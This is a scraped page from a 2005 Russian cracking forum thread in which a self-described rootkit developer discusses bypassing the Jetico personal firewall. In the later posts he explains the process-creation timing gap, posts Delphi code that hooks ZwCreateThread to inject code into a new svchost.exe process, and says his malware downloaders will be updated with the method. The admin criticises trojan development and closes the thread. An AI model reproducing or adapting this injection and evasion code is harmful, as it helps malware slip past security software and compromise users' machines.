<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 09:39 <br><script type="text/javascript">QU('FKMA','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=FKMA" target="_blank">Личное сообщение</a> &middot;  <a href="#15" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#15');return false;">#15</a> </span><div align=left><br>
<I>Ms-Rem пишет:
<br>А ты сначала проверь пример из атача. В данном случае фаерволл не может контролировать WriteProcessMemory (это связано с одним из ключевых принципов работы Windows). </I>
<br>
<br>Jetico Personal Firewall прекрасно отловил попытку 
<br><i class=x>Event:	attacker writes to application&#039;s memory
<br>Attacker: E:&#92;FASM&#92;2103_FireFuck.exe	
<br></i>
<br>Так что не прокатывает пока ;) Можно спать спокойно <img src="img/smilies/s1.gif" alt="">
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43817&amp;user=2918&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=15" class="addthx" data-post="43817"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="16" onfocus="this.blur()" href="JavaScript:di('[b]Ms-Rem[/b]','')">Ms-Rem</a></b><br></div>
<img src="img/s5.gif" alt=""><br><img style="padding-top:3px;" src="av/1798.gif" alt=""><br><span class=txtSm>Ранг: 120.6 (ветеран)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.17'>Активность: 0.09<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1798">Участник</a><br><font color=blue>rootkit developer</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 12:47 <br><script type="text/javascript">QU('Ms-Rem','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Ms-Rem" target="_blank">Личное сообщение</a> &middot;  <a href="#16" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#16');return false;">#16</a> </span><div align=left><br>
Ща поставлю этот фаер и проверю, но не жумай что можно спать спокойно, есть и более серьезные методы обхода.
<br><br><font size="1"><i>-----<br>Скажем дружно - нафиг нужно.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43826&amp;user=1798&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=16" class="addthx" data-post="43826"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="17" onfocus="this.blur()" href="JavaScript:di('[b]Bad_guy[/b]','')">Bad_guy</a></b><br></div>
<img src="img/s8.gif" alt=""><br><img style="padding-top:3px;" src="av/7.gif" alt=""><br><span class=txtSm>Ранг: 536.4 (<b>!</b>), 171thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.97'>Активность: 0.66<span style='color:red'>&searr;</span>0.13</span><br>Статус: <a href="action=userinfo&amp;user=7">Администратор</a><br><font color=blue>Создатель CRACKL@B</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 13:22 <br><script type="text/javascript">QU('Bad_guy','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Bad_guy" target="_blank">Личное сообщение</a> &middot;  <a href="#17" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#17');return false;">#17</a> </span><div align=left><br>
Горько смотреть когда талантливые люди озабочены разработкой опасных троянов.
<br><br><font size="1"><i>-----<br>Всем не угодишь</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43829&amp;user=7&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=17" class="addthx" data-post="43829"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="18" onfocus="this.blur()" href="JavaScript:di('[b]Ms-Rem[/b]','')">Ms-Rem</a></b><br></div>
<img src="img/s5.gif" alt=""><br><img style="padding-top:3px;" src="av/1798.gif" alt=""><br><span class=txtSm>Ранг: 120.6 (ветеран)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.17'>Активность: 0.09<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1798">Участник</a><br><font color=blue>rootkit developer</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 13:32 &middot; Поправил: Ms-Rem <br><script type="text/javascript">QU('Ms-Rem','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Ms-Rem" target="_blank">Личное сообщение</a> &middot;  <a href="#18" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#18');return false;">#18</a> </span><div align=left><br>
&gt;&gt;Jetico Personal Firewall прекрасно отловил попытку
<br>
<br>Странно, я сейчас проверил на Jetico Personal Firewall 1.0.1.61, и файл скачался успешно.
<br>Какая у тебя версия фаерволла, и как его нужно настроить чтобы он отлавливал вышеприведенный пример?
<br>Если он действительно его отлавливает (что неудивительно, так как я его полгода назад на паблик выложил), то могу точно сказать что это ненадолго.
<br>
<br>Немного теории:
<br>При запуске процесса происходит сначала чоздание его адресного пространства (ZwCreateProcess), затем создание его PEB и заполнение ее начальными значениями (командная строка, переменные окружения и.т.д.), в этом момент родительский процесс ПИШЕТ В ПАМЯТЬ ДОЧЕРНЕГО. После чего создается первый поток процесса (ZwCreateThread) и запускается (ZwResumeThread).
<br>Вышеприведенный пример основан на том, что фаерволлы не контролируют запись в память процесса до момента старта его первого потока (по вышеприведенным причинам). Процесс создается в приостановленом состоянии, в него записывается код и меняется стартовый контекст потока.
<br>Обнаружение этого метода обхода фаерволла возможно путем контроля диапазона адресов памяти по которым происходит запись при создании процесса. Если фаерволлы уже это делают, то мне просто нужно будет записать шелкод в диапазон аресов PEB, и в этом случае просто НЕВОЗМОЖНО 100% достоверно отличить такую атаку от нормального запуска процесса.
<br><br><font size="1"><i>-----<br>Скажем дружно - нафиг нужно.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43830&amp;user=1798&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=18" class="addthx" data-post="43830"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="19" onfocus="this.blur()" href="JavaScript:di('[b]ValdiS[/b]','')">ValdiS</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/1263.gif" alt=""><br><span class=txtSm>Ранг: 420.3 (мудрец)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.42'>Активность: 0.24<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1263">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 13:40 <br><script type="text/javascript">QU('ValdiS','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ValdiS" target="_blank">Личное сообщение</a> &middot;  <a href="#19" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#19');return false;">#19</a> </span><div align=left><br>
<I>Bad_guy пишет:
<br>Горько смотреть когда талантливые люди озабочены разработкой опасных троянов. </I>
<br><b>Ms-Rem</b>, правда, может не стоит <I>Ms-Rem пишет:
<br>Если он действительно его отлавливает (что неудивительно, так как я его полгода назад на паблик выложил), то могу точно сказать что это ненадолго. </I>
<br>Вирь, собранный из твоих исходников, уже был на этом сайте. <img src="img/smilies/s4.gif" alt=""> А в твоей компетентности никто и не сомневается...
<br><br><font size="1"><i>-----<br>Сколько ни наталкивали на мысль – все равно сумел увернуться</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43831&amp;user=1263&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=19" class="addthx" data-post="43831"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="20" onfocus="this.blur()" href="JavaScript:di('[b]FKMA[/b]','')">FKMA</a></b><br></div>
<img src="img/s2.gif" alt=""><br><span class=txtSm>Ранг: 20.9 (новичок)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.69'>Активность: 0.01<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2918">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 14:09 &middot; Поправил: FKMA <br><script type="text/javascript">QU('FKMA','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=FKMA" target="_blank">Личное сообщение</a> &middot;  <a href="#20" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#20');return false;">#20</a> </span><div align=left><br>
<I>Ms-Rem пишет:
<br> я сейчас проверил на Jetico Personal Firewall 1.0.1.61, и файл скачался успешно. </I>
<br>Версия такая же.
<br><I>Ms-Rem пишет:
<br>как его нужно настроить чтобы он отлавливал вышеприведенный пример? </I>
<br>Специально настраивать не надо (я не настраивал). 
<br>Система WXP SP2.
<br><I>Ms-Rem пишет:
<br>Если фаерволлы уже это делают, то мне просто нужно будет записать шелкод в диапазон аресов PEB </I>
<br>Джетика хучит ZwWriteVirtualMemory в ServiceDescriptionTable. Возможно она позволяет писать в PEB только в течении вызова ZwCreateProcess, вернее CreateProcess сам туда пишет. А все последующие попытки блокирует. Предполагаю, что если ты попробуешь писать в PEB после возврата из ZwCreateProcess, то все равно она перехватит.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43834&amp;user=2918&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=20" class="addthx" data-post="43834"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="21" onfocus="this.blur()" href="JavaScript:di('[b]Ms-Rem[/b]','')">Ms-Rem</a></b><br></div>
<img src="img/s5.gif" alt=""><br><img style="padding-top:3px;" src="av/1798.gif" alt=""><br><span class=txtSm>Ранг: 120.6 (ветеран)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.17'>Активность: 0.09<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1798">Участник</a><br><font color=blue>rootkit developer</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 15:53 <br><script type="text/javascript">QU('Ms-Rem','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Ms-Rem" target="_blank">Личное сообщение</a> &middot;  <a href="#21" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#21');return false;">#21</a> </span><div align=left><br>
Jetico у меня не ловил этот пример потому, что один из моих драйверов мешал ему хукать SDT.
<br>Он действительно отлавливает этот пример, и я сейчас более подробно исследовал его работу.
<br>Jetico помимо ZwWriteVirtualMemory хукает еще и ZwCreateThread. 
<br>Так как запись в память процесса при его создании происходит до создания потока, то после вызова ZwCreateThread начинает работать контроль. После создания первого потока может происходить еще одна запись в PEB (при установке некоторых полей PEB), поэтому после создания, но до запуска потока еще можно записывать в PEB, но не более 20 байт (проверка идет в обработчике хука ZwWriteVirtualMemory драйвера фаерволла).
<br>В общем неплохой метод защиты, но если чуток пораскинуть мозгами, то и эта защита идет лесом, для этого нужно записать в память процесса сразу же после создания адресного пространства и не использовать CreateRemoteThread для запуска кода. Ниже приведен пример инжекта в дочерний процесс который я накатал за 5 минут.
<br>
<br><code>program Project2;
<br>
<br>uses
<br>  windows, advApiHook, NativeApi;
<br>
<br>procedure InjectProc();
<br>asm
<br>@a:
<br>jmp @a
<br>end;
<br>procedure InjectEnd(); asm end;
<br>
<br>var
<br> TrueZwCreateThread: function(ThreadHandle: pdword;
<br>                        DesiredAccess: ACCESS_MASK;
<br>                        ObjectAttributes: pointer;
<br>                        ProcessHandle: THandle;
<br>                        ClientId: PClientID;
<br>                        ThreadContext: PContext;
<br>                        UserStack: pointer;
<br>                        CreateSuspended: boolean):NTStatus;
<br>                        stdcall;
<br> EpAddr: pointer;
<br>
<br>Function NewZwCreateThread(ThreadHandle: pdword;
<br>                        DesiredAccess: ACCESS_MASK;
<br>                        ObjectAttributes: pointer;
<br>                        ProcessHandle: THandle;
<br>                        ClientId: PClientID;
<br>                        ThreadContext: PContext;
<br>                        UserStack: pointer;
<br>                        CreateSuspended: boolean):NTStatus;
<br>                        stdcall;
<br>var 
<br> Bytes: dword;
<br> InjSize: dword;
<br>begin
<br>  InjSize := dword(@InjectEnd) - dword(@InjectProc);
<br>  WriteProcessMemory(ProcessHandle, EpAddr, @InjectProc, InjSize, Bytes);
<br>  Result := TrueZwCreateThread(ThreadHandle, DesiredAccess, ObjectAttributes,
<br>                               ProcessHandle, ClientId, ThreadContext,
<br>                               UserStack, CreateSuspended);
<br>end;
<br>
<br>var
<br> si: TStartupInfo;
<br> pi: TProcessInformation;
<br> dHdr: PIMageDosHeader;
<br> nHdr: PImageNtHeaders;
<br>
<br>begin
<br> dHdr := pointer(LoadLibraryEx(&#039;svchost.exe&#039;, 0,  DONT_RESOLVE_DLL_REFERENCES));
<br> nHdr := pointer(dword(dHdr) + dHdr^._lfanew);
<br> EpAddr := pointer(nHdr^.OptionalHeader.AddressOfEntryPoint + nHdr^.OptionalHeader.ImageBase);
<br> HookProc(&#039;ntdll.dll&#039;, &#039;ZwCreateThread&#039;, @NewZwCreateThread, @TrueZwCreateThread);
<br> ZeroMemory(@Si, sizeof(Si));
<br> si.cb := sizeof(si);
<br> CreateProcess(nil, &#039;svchost.exe&#039;, nil, nil, false, 0, nil, nil, si, pi);  
<br>end.</code>
<br>
<br>Этот пример показывает воможность обхода Jetico. Пока что нет времени довести его до ума, но через пару дней все довнлоадеры будут обновлены с учетом всего вышесказаного.
<br>
<br>FKMA - большое тебе спасибо за помощь!
<br><br><font size="1"><i>-----<br>Скажем дружно - нафиг нужно.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43842&amp;user=1798&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=21" class="addthx" data-post="43842"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="22" onfocus="this.blur()" href="JavaScript:di('[b]FKMA[/b]','')">FKMA</a></b><br></div>
<img src="img/s2.gif" alt=""><br><span class=txtSm>Ранг: 20.9 (новичок)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.69'>Активность: 0.01<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2918">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 22:00 <br><script type="text/javascript">QU('FKMA','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=FKMA" target="_blank">Личное сообщение</a> &middot;  <a href="#22" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#22');return false;">#22</a> </span><div align=left><br>
<I>Ms-Rem пишет:
<br>Этот пример показывает воможность обхода Jetico. </I>
<br>Черт, до безобразия хороший способ <img src="img/smilies/s1.gif" alt=""> Это тебе спасибо за исследование.
<br>Придется теперь разрабам джетики писать, чтоб получше эту проверку реализовали <img src="img/smilies/s1.gif" alt="">
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43887&amp;user=2918&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=22" class="addthx" data-post="43887"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="23" onfocus="this.blur()" href="JavaScript:di('[b]xDriver[/b]','')">xDriver</a></b><br></div>
<img src="img/s3.gif" alt=""><br><span class=txtSm>Ранг: 45.1 (посетитель)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.71'>Активность: 0.03<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=587">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 28 ноября 2005 19:22 <br><script type="text/javascript">QU('xDriver','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=xDriver" target="_blank">Личное сообщение</a> &middot;  <a href="#23" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#23');return false;">#23</a> </span><div align=left><br>
Вот в продолжение темы (по Асе пришло):
<br><i class=x>
<br>halmer (15:01:43 28/11/2005)
<br>привет. ты знаешь место где программы за бабки ломают? сам не можешь взяться ?
<br></i>
<br>
<br>Вот сижу и думаю кто такой halmer и где я Асю засветил <img src="img/smilies/s13.gif" alt="">
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=44017&amp;user=587&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=23" class="addthx" data-post="44017"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="24" onfocus="this.blur()" href="JavaScript:di('[b]Bad_guy[/b]','')">Bad_guy</a></b><br></div>
<img src="img/s8.gif" alt=""><br><img style="padding-top:3px;" src="av/7.gif" alt=""><br><span class=txtSm>Ранг: 536.4 (<b>!</b>), 171thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.97'>Активность: 0.66<span style='color:red'>&searr;</span>0.13</span><br>Статус: <a href="action=userinfo&amp;user=7">Администратор</a><br><font color=blue>Создатель CRACKL@B</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 28 ноября 2005 22:12 <br><script type="text/javascript">QU('Bad_guy','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Bad_guy" target="_blank">Личное сообщение</a> &middot;  <a href="#24" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#24');return false;">#24</a> </span><div align=left><br>
<b>xDriver</b>
<br>Асю ты засветил тут
<br><a href="http://exelab.ru/f/action=userinfo&amp;user=587
" target="_new">http://exelab.ru/f/action=userinfo&amp;user=587
</a><br>
<br>...а вообще оффтоп пошёл, тему закрываю.
<br><br><font size="1"><i>-----<br>Всем не угодишь</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=44041&amp;user=7&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=24" class="addthx" data-post="44041"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>


</table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b> <a href="action=vthread&amp;forum=2&amp;topic=3323&amp;page=0.html">&lt;&lt;</a> .  <a href="action=vthread&amp;forum=2&amp;topic=3323&amp;page=0.html">1</a> . <b>2</b> .</b></span></td></tr></table>
<table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/red.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=2&sortBy=0&page=0.html"><b>Крэки, обсуждения</b></a> <b class=bulletHead>&#8212;&#8250;</b> Андеграунд совсем обнаглел</span></td>
</tr></table>
</div>
<a name=newreply></a>
<div align=center>
<table class=forums>
<tr>
<td class=caption4 width="100%"><span class=header>Эта тема закрыта. Ответы больше не принимаются.</span></td>
</tr>
</table>
</div>
<script type="text/javascript" src="templates/vthread_logged.js"></script>
<div align=center><table class=tbTransparent><tr>
<td class=tbTransparent><span class=txtSm>      &nbsp;&nbsp;&nbsp;<a href="/f/forprint.php?topic_id=3323" title="Версия для печати"><img src="img/forprint.gif" border="0" alt="Для печати"> Для печати</a>&nbsp;</span></td>
</tr></table></div>
<br>
 
<br><br><br></center>

</div>
<div id="footer">Вы находитесь на EXELAB.rU</div>
<div id="footer_btns">
<a href="http://www.reactos.org" rel="nofollow" target="_blank"><img src="./images/react.png" height="31" width="88" border="0" title="" alt=""></a> <script type="text/javascript"><!--
document.write("<img src='//counter.yadro.ru/hit?t44.2;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";h"+escape(document.title.substring(0,80))+";"+Math.random()+
"' "+
"border='0' width='31' height='31'>")
//--></script>
</div>
</div>

</body></html>
